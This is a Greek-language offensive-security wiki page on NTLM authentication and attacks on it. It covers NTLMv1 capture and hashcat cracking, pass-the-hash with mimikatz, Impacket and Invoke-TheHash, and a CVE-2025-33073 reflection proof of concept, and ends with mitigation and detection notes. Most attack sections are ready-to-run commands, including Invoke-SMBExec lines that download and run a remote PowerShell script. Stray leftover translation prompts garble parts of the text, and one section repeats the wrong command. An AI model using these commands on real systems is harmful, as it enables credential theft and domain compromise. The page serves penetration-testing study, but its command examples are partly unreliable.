# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Βασικές πληροφορίες

Σε περιβάλλοντα όπου λειτουργούν τα **Windows XP και Server 2003**, χρησιμοποιούνται LM (Lan Manager) hashes, αν και είναι ευρέως γνωστό ότι μπορούν να παραβιαστούν εύκολα. Ένα συγκεκριμένο LM hash, `AAD3B435B51404EEAAD3B435B51404EE`, υποδεικνύει ότι το LM δεν χρησιμοποιείται και αντιπροσωπεύει το hash μιας κενής συμβολοσειράς.

Από προεπιλογή, το πρωτόκολλο authentication **Kerberos** είναι η κύρια μέθοδος που χρησιμοποιείται. Το NTLM (NT LAN Manager) ενεργοποιείται σε συγκεκριμένες περιπτώσεις: απουσία Active Directory, μη ύπαρξη του domain, δυσλειτουργία του Kerberos λόγω εσφαλμένης ρύθμισης ή όταν επιχειρούνται συνδέσεις με χρήση μιας IP address αντί για έγκυρο hostname.

Η παρουσία της κεφαλίδας **"NTLMSSP"** στα network packets υποδεικνύει μια διαδικασία NTLM authentication.

Η υποστήριξη των authentication protocols - LM, NTLMv1 και NTLMv2 - παρέχεται από ένα συγκεκριμένο DLL που βρίσκεται στη διαδρομή `%windir%\Windows\System32\msv1\_0.dll`.

**Βασικά σημεία**:

- Τα LM hashes είναι ευάλωτα και ένα κενό LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) υποδεικνύει ότι δεν χρησιμοποιείται.
- Το Kerberos είναι η προεπιλεγμένη μέθοδος authentication, ενώ το NTLM χρησιμοποιείται μόνο υπό συγκεκριμένες συνθήκες.
- Τα NTLM authentication packets αναγνωρίζονται από την κεφαλίδα "NTLMSSP".
- Τα πρωτόκολλα LM, NTLMv1 και NTLMv2 υποστηρίζονται από το system file `msv1\_0.dll`.

## LM, NTLMv1 και NTLMv2

Μπορείτε να ελέγξετε και να ρυθμίσετε ποιο protocol θα χρησιμοποιείται:

### GUI

Εκτελέστε το _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. Υπάρχουν 6 επίπεδα (από το 0 έως το 5).

![LM, NTLMv1 και NTLMv2 - GUI: Εκτέλεση του secpol.msc - Local policies - Security Options - Network Security: LAN Manager authentication level. Υπάρχουν 6 επίπεδα (από το 0 έως το 5)](<../../images/image (919).png>)

### Registry

Αυτό θα ορίσει το επίπεδο 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Πιθανές τιμές:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Βασικό σχήμα authentication domain NTLM

1. Ο **user** εισάγει τα **credentials** του
2. Το client machine **στέλνει ένα authentication request**, στέλνοντας το **domain name** και το **username**
3. Ο **server** στέλνει το **challenge**
4. Το **client κρυπτογραφεί** το **challenge**, χρησιμοποιώντας ως key το hash του password, και το στέλνει ως response
5. Ο **server στέλνει** στον **Domain controller** το **domain name, το username, το challenge και το response**. Αν **δεν** υπάρχει ρυθμισμένο Active Directory ή το domain name είναι το όνομα του server, τα credentials **ελέγχονται τοπικά**.
6. Ο **domain controller ελέγχει αν όλα είναι σωστά** και στέλνει τις πληροφορίες στον server

Ο **server** και ο **Domain Controller** μπορούν να δημιουργήσουν ένα **Secure Channel** μέσω του **Netlogon** server, καθώς ο Domain Controller γνωρίζει το password του server (βρίσκεται μέσα στη βάση **NTDS.DIT**).

### Σχήμα local NTLM authentication

Το authentication είναι όπως αυτό που αναφέρθηκε **προηγουμένως, αλλά** ο **server** γνωρίζει το **hash του user** που προσπαθεί να κάνει authentication μέσα στο αρχείο **SAM**. Έτσι, αντί να ζητήσει από τον Domain Controller, ο **server θα ελέγξει ο ίδιος** αν ο user μπορεί να κάνει authentication.

### NTLMv1 Challenge

Το **μήκος του challenge είναι 8 bytes** και το **response έχει μήκος 24 bytes**.

Το **NT hash (16bytes)** διαιρείται σε **3 μέρη των 7bytes το καθένα** (7B + 7B + (2B+0x00\*5)): το **τελευταίο μέρος συμπληρώνεται με μηδενικά**. Στη συνέχεια, το **challenge** γίνεται **ciphered ξεχωριστά** με κάθε μέρος και τα **resulting** ciphered bytes **ενώνονται**. Σύνολο: 8B + 8B + 8B = 24Bytes.

**Προβλήματα**:

- Έλλειψη **randomness**
- Τα 3 μέρη μπορούν να **δεχθούν ξεχωριστή επίθεση** για την εύρεση του NT hash
- Το **DES μπορεί να γίνει crack**
- Το 3ο key αποτελείται πάντα από **5 μηδενικά**.
- Με δεδομένο το **ίδιο challenge**, το **response** θα είναι **το ίδιο**. Έτσι, μπορείς να δώσεις ως **challenge** στο victim το string "**1122334455667788**" και να κάνεις attack στο response χρησιμοποιώντας **precomputed rainbow tables**.

### NTLMv1 attack

Το unconstrained delegation είναι λιγότερο συνηθισμένο σε σύγχρονα περιβάλλοντα, αλλά ένα προσβάσιμο **Print Spooler service** μπορεί ακόμη να γίνει abuse για να εξαναγκάσει authentication προς ένα τέτοιο host.

Θα μπορούσες να κάνεις abuse σε ορισμένα credentials/sessions που ήδη έχεις στο AD, ώστε να **ζητήσεις από τον printer να κάνει authentication** σε κάποιον **host υπό τον έλεγχό σου**. Στη συνέχεια, χρησιμοποιώντας το `metasploit auxiliary/server/capture/smb` ή το `responder`, μπορείς να **ορίσεις το authentication challenge σε 1122334455667788**, να καταγράψεις την προσπάθεια authentication και, αν έγινε με χρήση **NTLMv1**, θα μπορείς να **κάνεις crack** στο αποτέλεσμα.\
Αν χρησιμοποιείς το `responder`, θα μπορούσες να δοκιμάσεις να **χρησιμοποιήσεις το flag `--lm`** για να προσπαθήσεις να κάνεις **downgrade** στο **authentication**.\
_Σημείωσε ότι για αυτή την τεχνική το authentication πρέπει να πραγματοποιηθεί με χρήση NTLMv1 (το NTLMv2 δεν είναι έγκυρο)._

Να θυμάσαι ότι ο printer θα χρησιμοποιήσει το computer account κατά το authentication και τα computer accounts χρησιμοποιούν **μεγάλα και τυχαία passwords**, τα οποία **πιθανότατα δεν θα μπορέσεις να κάνεις crack** χρησιμοποιώντας κοινά **dictionaries**. Ωστόσο, το **NTLMv1** authentication **χρησιμοποιεί DES** ([περισσότερες πληροφορίες εδώ](#ntlmv1-challenge)), επομένως, χρησιμοποιώντας ορισμένα services ειδικά αφιερωμένα στο cracking του DES, θα μπορέσεις να το κάνεις crack (θα μπορούσες, για παράδειγμα, να χρησιμοποιήσεις τα [https://crack.sh/](https://crack.sh) ή [https://ntlmv1.com/](https://ntlmv1.com)).

### NTLMv1 attack με hashcat

Το NTLMv1 μπορεί επίσης να δεχθεί attack με το [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi), το οποίο μετατρέπει τα captured NTLMv1 messages σε formats κατάλληλα για το Hashcat.<sup>[[1]](#references)</sup>

Η εντολή
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
θα παρήγαγε τα παρακάτω:
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Please provide the content to include in the file.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Εκτελέστε το hashcat (η κατανεμημένη εκτέλεση είναι προτιμότερη μέσω ενός εργαλείου όπως το hashtopolis), καθώς διαφορετικά θα χρειαστούν αρκετές ημέρες.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
Σε αυτήν την περίπτωση γνωρίζουμε ότι το password είναι `password`, οπότε θα χρησιμοποιήσουμε cheat για σκοπούς επίδειξης:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Τώρα πρέπει να χρησιμοποιήσουμε τα hashcat-utilities για να μετατρέψουμε τα cracked des keys σε τμήματα του NTLM hash:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Παρακαλώ επικολλήστε το τελευταίο μέρος του κειμένου για μετάφραση.
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Please provide the English text or file content to translate and combine.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**Το μήκος του challenge είναι 8 bytes** και **στέλνονται 2 responses**: Το ένα έχει μήκος **24 bytes** και το μήκος του **άλλου** είναι **μεταβλητό**.

**Το πρώτο response** δημιουργείται με ciphering μέσω **HMAC_MD5** του **string** που αποτελείται από το **client και το domain**, χρησιμοποιώντας ως **key** το **hash MD4** του **NT hash**. Έπειτα, το **result** χρησιμοποιείται ως **key** για ciphering μέσω **HMAC_MD5** του **challenge**. Σε αυτό προστίθεται ένα **client challenge των 8 bytes**. Σύνολο: 24 B.

**Το δεύτερο response** δημιουργείται χρησιμοποιώντας **διάφορες τιμές** (ένα νέο client challenge, ένα **timestamp** για την αποτροπή **replay attacks**...)

Αν διαθέτετε ένα **PCAP που περιέχει μια επιτυχημένη ανταλλαγή authentication**, εξαγάγετε το domain, το username, το server challenge και το NTLMv2 response, μορφοποιήστε το capture για το Hashcat και χρησιμοποιήστε το mode `5600` για να επιχειρήσετε password recovery. Το αρχειοθετημένο πρακτικό walkthrough διατηρεί τη διαδικασία εξαγωγής των packet fields, ενώ τα παραδείγματα του Hashcat ορίζουν το τρέχον αποδεκτό format.<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**Μόλις αποκτήσετε το hash του θύματος**, μπορείτε να το χρησιμοποιήσετε για να το **impersonate**.\
Πρέπει να χρησιμοποιήσετε ένα **tool** που θα **εκτελέσει** το **NTLM authentication χρησιμοποιώντας** αυτό το **hash**, ή μπορείτε να δημιουργήσετε ένα νέο **sessionlogon** και να **inject** αυτό το **hash** μέσα στο **LSASS**, ώστε κάθε φορά που **εκτελείται NTLM authentication**, να χρησιμοποιείται **αυτό το hash**. Αυτό κάνει το mimikatz.

**Παρακαλούμε θυμηθείτε ότι μπορείτε να εκτελέσετε επιθέσεις Pass-the-Hash και χρησιμοποιώντας Computer accounts.**

### **Mimikatz**

**Πρέπει να εκτελεστεί ως administrator**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Αυτό εκκινεί μια διεργασία υπό τον τρέχοντα local user, ενώ το LSASS συσχετίζει τα παρεχόμενα credentials με το εξερχόμενο network logon. Στη συνέχεια μπορείτε να αποκτήσετε πρόσβαση σε network resources ως ο παρεχόμενος user, παρόμοια με το `runas /netonly`, χωρίς να γνωρίζετε το plaintext password.

### Pass-the-Hash from linux

Μπορείτε να αποκτήσετε code execution σε Windows machines χρησιμοποιώντας Pass-the-Hash από Linux.\
[**Δείτε πρακτικά παραδείγματα εκτέλεσης Pass-the-Hash.**](../lateral-movement/psexec-and-winexec.md#pass-the-hash)

### Impacket Windows compiled tools

Μπορείτε να κατεβάσετε[ impacket binaries for Windows εδώ](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (Σε αυτήν την περίπτωση πρέπει να καθορίσετε μια εντολή, τα cmd.exe και powershell.exe δεν είναι έγκυρα για την απόκτηση interactive shell)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Υπάρχουν αρκετά ακόμη Impacket binaries...

### Invoke-TheHash

Μπορείτε να λάβετε τα powershell scripts από εδώ: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Αυτή η συνάρτηση συνδυάζει τις προηγούμενες λειτουργίες. Μπορείτε να περάσετε **πολλά hosts**, να εξαιρέσετε επιλεγμένους στόχους και να επιλέξετε _SMBExec, WMIExec, SMBClient,_ ή _SMBEnum_. Αν επιλέξετε **SMBExec** ή **WMIExec** χωρίς παράμετρο _**Command**_, ελέγχει μόνο αν έχετε επαρκή δικαιώματα.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Πρέπει να εκτελεστεί ως administrator**

Αυτό το tool κάνει το ίδιο πράγμα με το mimikatz (τροποποιεί τη μνήμη του LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Manual Windows remote execution with username and password


{{#ref}}
../lateral-movement/
{{#endref}}

## Εξαγωγή διαπιστευτηρίων από Windows Host

Για περισσότερες πληροφορίες, δείτε το [**Stealing Windows Credentials**](../stealing-credentials/README.md).

## Internal Monologue attack

Το Internal Monologue Attack είναι μια stealthy τεχνική εξαγωγής διαπιστευτηρίων που επιτρέπει σε έναν attacker να ανακτήσει NTLM hashes από το machine ενός θύματος **χωρίς να αλληλεπιδρά άμεσα με τη διεργασία LSASS**. Σε αντίθεση με το Mimikatz, το οποίο διαβάζει hashes απευθείας από τη μνήμη και συχνά μπλοκάρεται από endpoint security solutions ή το Credential Guard, αυτή η επίθεση αξιοποιεί **local calls προς το NTLM authentication package (MSV1_0) μέσω του Security Support Provider Interface (SSPI)**. Ο attacker αρχικά **υποβαθμίζει τις NTLM ρυθμίσεις** (π.χ. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic), ώστε να επιτρέπεται το NetNTLMv1. Στη συνέχεια κάνει impersonate τα υπάρχοντα user tokens που λαμβάνονται από running processes και ενεργοποιεί τοπικά NTLM authentication για να δημιουργήσει NetNTLMv1 responses χρησιμοποιώντας ένα γνωστό challenge.<sup>[[4]](#references)</sup>

Μετά τη σύλληψη αυτών των NetNTLMv1 responses, ο attacker μπορεί να ανακτήσει γρήγορα τα αρχικά NTLM hashes χρησιμοποιώντας **precomputed rainbow tables**, επιτρέποντας περαιτέρω Pass-the-Hash attacks για lateral movement. Το σημαντικό είναι ότι το Internal Monologue Attack παραμένει stealthy, επειδή δεν δημιουργεί network traffic, δεν κάνει inject code και δεν ενεργοποιεί direct memory dumps, γεγονός που το καθιστά δυσκολότερο να εντοπιστεί από τους defenders σε σύγκριση με παραδοσιακές μεθόδους όπως το Mimikatz.

Αν το NetNTLMv1 δεν γίνεται αποδεκτό — λόγω επιβεβλημένων security policies — ο attacker ενδέχεται να αποτύχει να ανακτήσει NetNTLMv1 response.

Για την αντιμετώπιση αυτής της περίπτωσης, το Internal Monologue tool ενημερώθηκε: αποκτά δυναμικά ένα server token χρησιμοποιώντας `AcceptSecurityContext()`, ώστε να μπορεί να **συλλαμβάνει NetNTLMv2 responses** αν αποτύχει το NetNTLMv1. Παρότι το NetNTLMv2 είναι πολύ δυσκολότερο να γίνει crack, εξακολουθεί να ανοίγει τον δρόμο για relay attacks ή offline brute-force σε περιορισμένες περιπτώσεις.

Το PoC βρίσκεται στο **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.<sup>[[4]](#references)</sup>

## NTLM Relay and Responder

**Διαβάστε εδώ έναν πιο αναλυτικό οδηγό για το πώς εκτελούνται αυτές οι επιθέσεις:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Ανάλυση NTLM challenges από network capture

**Μπορείτε να χρησιμοποιήσετε το** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM & Kerberos *Reflection* μέσω Serialized SPNs (CVE-2025-33073)

Τα Windows περιέχουν αρκετά mitigations που προσπαθούν να αποτρέψουν *reflection* attacks, όπου ένα NTLM (ή Kerberos) authentication που προέρχεται από ένα host γίνεται relay πίσω στον **ίδιο** host για την απόκτηση SYSTEM privileges.

Η Microsoft έσπασε τις περισσότερες public chains με τα MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) και τα μεταγενέστερα patches. Ωστόσο, το **CVE-2025-33073** δείχνει ότι οι προστασίες μπορούν ακόμη να παρακαμφθούν μέσω abuse του τρόπου με τον οποίο ο **SMB client περικόπτει τα Service Principal Names (SPNs)** που περιέχουν *marshalled* (serialized) target-info.<sup>[[5]](#references)[[6]](#references)</sup>

### TL;DR του bug
1. Ένας attacker καταχωρίζει ένα **DNS A-record** του οποίου το label κωδικοποιεί ένα marshalled SPN — π.χ.
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Το θύμα εξαναγκάζεται να κάνει authentication προς αυτό το hostname (PetitPotam, DFSCoerce κ.λπ.).
3. Όταν ο SMB client περνά το target string `cifs/srv11UWhRCAAAAA…` στη `lsasrv!LsapCheckMarshalledTargetInfo`, η κλήση προς το `CredUnmarshalTargetInfo` **αφαιρεί** το serialized blob, αφήνοντας το **`cifs/srv1`**.
4. Το `msv1_0!SspIsTargetLocalhost` (ή το αντίστοιχο του Kerberos) θεωρεί πλέον ότι το target είναι *localhost*, επειδή το σύντομο host part ταιριάζει με το όνομα του computer (`SRV1`).
5. Ως αποτέλεσμα, ο server θέτει το `NTLMSSP_NEGOTIATE_LOCAL_CALL` και inject-άρει το **SYSTEM access-token του LSASS** στο context (για το Kerberos δημιουργείται ένα SYSTEM-marked subsession key).
6. Το relaying αυτού του authentication με `ntlmrelayx.py` **ή** `krbrelayx.py` παρέχει πλήρη SYSTEM rights στον ίδιο host.<sup>[[5]](#references)</sup>

### Quick PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patches & Mitigations
* Το KB patch για το **CVE-2025-33073** προσθέτει έναν έλεγχο στο `mrxsmb.sys::SmbCeCreateSrvCall`, ο οποίος μπλοκάρει οποιαδήποτε σύνδεση SMB της οποίας ο στόχος περιέχει marshalled info (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Επιβάλετε **SMB signing** για την αποτροπή reflection ακόμη και σε hosts χωρίς patch.
* Παρακολουθείτε DNS records που μοιάζουν με `*<base64>...*` και μπλοκάρετε coercion vectors (PetitPotam, DFSCoerce, AuthIP...).

### Ιδέες για Detection
* Network captures με `NTLMSSP_NEGOTIATE_LOCAL_CALL`, όπου η IP του client ≠ η IP του server.
* Kerberos AP-REQ που περιέχει subsession key και client principal ίσο με το hostname.
* Windows Event 4624/4648 SYSTEM logons που ακολουθούνται άμεσα από remote SMB writes από το ίδιο host.<sup>[[5]](#references)</sup>

Για το **Μάρτιος 2026** local reflection variant, το οποίο εκμεταλλεύεται **SMB arbitrary ports** και **TCP connection reuse** για να φτάσει στο `NT AUTHORITY\SYSTEM`, δείτε:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – Πολυεργαλείο NTLMv1](https://github.com/evilmog/ntlmv1-multi)
- [2] [Παραδείγματα hashes του Hashcat – NetNTLMv2 (mode 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell utilities για Pass The Hash](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: Ανάκτηση NTLM Hashes χωρίς πρόσβαση στο LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [Το NTLM Reflection είναι νεκρό, ζήτω το NTLM Reflection!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [Cracking ενός NTLMv2 Hash – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
